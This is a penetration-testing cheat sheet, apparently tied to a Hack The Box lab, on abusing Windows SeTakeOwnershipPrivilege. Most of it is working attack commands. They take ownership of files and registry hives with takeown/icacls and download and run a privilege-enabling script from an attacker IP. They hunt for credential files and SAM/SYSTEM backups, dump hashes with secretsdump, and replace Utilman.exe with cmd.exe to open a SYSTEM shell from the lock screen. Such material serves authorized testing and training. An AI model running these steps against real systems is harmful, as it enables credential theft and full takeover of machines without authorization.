## SeTakeOwnershipPrivilege

`SeTakeOwnershipPrivilege` assigns `WRITE_OWNER` rights over any securable object on the system, meaning a user with this privilege can take ownership of files, registry keys, services, AD objects, and processes regardless of the existing ACL. Ownership alone does not grant read or write access, but as the owner, you can immediately modify the DACL to grant yourself any permissions you want. 

***

## The Two-Step Exploitation Model

Every abuse of this privilege follows the same two-step pattern:

```
Step 1: takeown /f <target>     <- change owner to yourself
Step 2: icacls <target> /grant <user>:F  <- grant yourself full control

Ownership alone = no access
Ownership + DACL grant = full control
```

***

## Step 1: Enable the Privilege

The privilege is often present but disabled. Enable it before attempting to take ownership: 

```powershell
# Download and run the EnableAllTokenPrivs script
Invoke-WebRequest -Uri http://10.10.14.3/EnableAllTokenPrivs.ps1 -OutFile .\EnableAllTokenPrivs.ps1
Import-Module .\EnableAllTokenPrivs.ps1
.\EnableAllTokenPrivs.ps1

# Confirm it is now Enabled
whoami /priv | findstr SeTakeOwnership
# SeTakeOwnershipPrivilege    Take ownership of files or other objects    Enabled
```

***

## Step 2: Identify Your Target

### Sensitive Files on the Local System

```powershell
# Check ownership of interesting files
Get-ChildItem -Path "C:\Department Shares\Private\" -Recurse -ErrorAction SilentlyContinue |
    Select-Object FullName, LastWriteTime, @{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}

# Use cmd dir /q to view owner when PowerShell ACL query returns blank
cmd /c dir /q "C:\Department Shares\Private\IT"

# Quick search for credential-related files across the file system
Get-ChildItem C:\ -Recurse -Include "*.txt","*.xlsx","*.config","*.xml","*.kdbx","*.ini" `
    -ErrorAction SilentlyContinue | Select-Object FullName |
    Where-Object {$_.FullName -match "pass|cred|login|secret|key|token|vault"}
```

### High-Value Static File Targets

These files either contain credentials directly or allow you to extract them: 
```
Credential files:
C:\inetpub\wwwroot\web.config              <- DB connection strings, app credentials
C:\Windows\Microsoft.NET\Framework64\*\web.config
C:\xampp\htdocs\config.php                 <- XAMPP/LAMP credentials
C:\Windows\repair\SAM                      <- SAM hive backup (extract NTLM hashes)
C:\Windows\repair\SYSTEM                   <- SYSTEM hive backup (needed with SAM)
C:\Windows\repair\software                 <- Registry software backup
C:\Windows\repair\security                 <- Security hive backup
C:\Windows\System32\config\RegBack\SAM     <- Another SAM backup location
C:\Windows\System32\config\RegBack\SYSTEM
C:\Windows\System32\config\SecEvent.Evt    <- Security event log
C:\Windows\System32\config\default.sav
C:\Windows\System32\config\security.sav
C:\Windows\System32\config\software.sav
C:\Windows\System32\config\system.sav

Other targets:
*.kdbx    <- KeePass database
*.id_rsa  <- SSH private keys
unattend.xml / sysprep.xml / sysprep.inf  <- Unattended install files with cleartext passwords
```

***

## Step 3: Take Ownership and Grant Access

```powershell
# Take ownership
takeown /f "C:\Department Shares\Private\IT\cred.txt"
# SUCCESS: The file now owned by WINLPE-SRV01\htb-student

# Verify ownership changed
Get-ChildItem "C:\Department Shares\Private\IT\cred.txt" |
    Select-Object Name, @{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}

# Grant yourself full control
icacls "C:\Department Shares\Private\IT\cred.txt" /grant "$($env:USERNAME):F"
# processed file: ... Successfully processed 1 files

# Read the file
cat "C:\Department Shares\Private\IT\cred.txt"

# Take ownership of a whole directory tree
takeown /f "C:\Department Shares\Private\IT" /r /d y
icacls "C:\Department Shares\Private\IT" /grant "$($env:USERNAME):F" /t
```

***

## Alternate Attack Path: Utilman.exe Binary Replacement

`Utilman.exe` is the Windows Ease of Access application that runs as `NT AUTHORITY\SYSTEM` from the lock screen. Replacing it with `cmd.exe` gives a SYSTEM shell accessible without logging in: 

```cmd
:: Step 1: Take ownership
takeown /f C:\Windows\System32\Utilman.exe

:: Step 2: Grant yourself full control
icacls C:\Windows\System32\Utilman.exe /grant "%USERNAME%":F

:: Step 3: Back up the original (important for cleanup)
copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.exe.bak

:: Step 4: Replace with cmd.exe
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe

:: Step 5: Lock the screen (or wait for RDP session idle)
:: Win+L or: rundll32.exe user32.dll,LockWorkStation

:: Step 6: On the lock screen click "Ease of Access" icon
:: A cmd.exe session opens as NT AUTHORITY\SYSTEM
```

The same technique works with other lock screen binaries: 

```
C:\Windows\System32\osk.exe        <- On-Screen Keyboard
C:\Windows\System32\magnify.exe    <- Magnifier
C:\Windows\System32\narrator.exe   <- Narrator
C:\Windows\System32\displayswitch.exe
```

***

## SAM Hive Extraction via SeTakeOwnershipPrivilege

If the repair directory holds SAM/SYSTEM backups:

```powershell
# Take ownership and grant access to the hive backups
takeown /f C:\Windows\repair\SAM
icacls C:\Windows\repair\SAM /grant "$($env:USERNAME):F"
takeown /f C:\Windows\repair\SYSTEM
icacls C:\Windows\repair\SYSTEM /grant "$($env:USERNAME):F"

# Copy to a writable location
copy C:\Windows\repair\SAM C:\Windows\Temp\SAM
copy C:\Windows\repair\SYSTEM C:\Windows\Temp\SYSTEM

# Transfer to attack machine, then extract hashes
secretsdump.py -sam SAM -system SYSTEM LOCAL
# or
samdump2 SYSTEM SAM
```

***

## Cleanup and OpSec

Always attempt to revert changes. A changed file owner or unexpected ACE on a system file is an obvious indicator of compromise: 

```powershell
# Restore original ownership (requires SeTakeOwnershipPrivilege or admin)
icacls "C:\Department Shares\Private\IT\cred.txt" /setowner "WINLPE-SRV01\sccm_svc"

# Remove your ACE from the DACL
icacls "C:\Department Shares\Private\IT\cred.txt" /remove "$($env:USERNAME)"

# Restore Utilman if replaced
copy /y C:\Windows\System32\Utilman.exe.bak C:\Windows\System32\Utilman.exe
takeown /f C:\Windows\System32\Utilman.exe /a    <- restore to TrustedInstaller
icacls C:\Windows\System32\Utilman.exe /setowner "NT SERVICE\TrustedInstaller"
```

If reversion is not possible, document every modification clearly in the engagement report with timestamps and affected file paths.

***

## Full Attack Flow

```
whoami /priv -> SeTakeOwnershipPrivilege present
       |
       v
Enable it (EnableAllTokenPrivs.ps1)
       |
       v
Choose target based on goal:
       |
       |-- Credentials  -> web.config, SAM/SYSTEM backup, cred files, KeePass
       |-- SYSTEM shell -> Utilman.exe, osk.exe replacement
       |-- AD recon     -> sensitive share files, scripts, config files
       |
       v
takeown /f <target>
icacls <target> /grant <user>:F
       |
       v
Read / modify / replace file
       |
       v
Revert changes (takeown + icacls + restore backup)
```
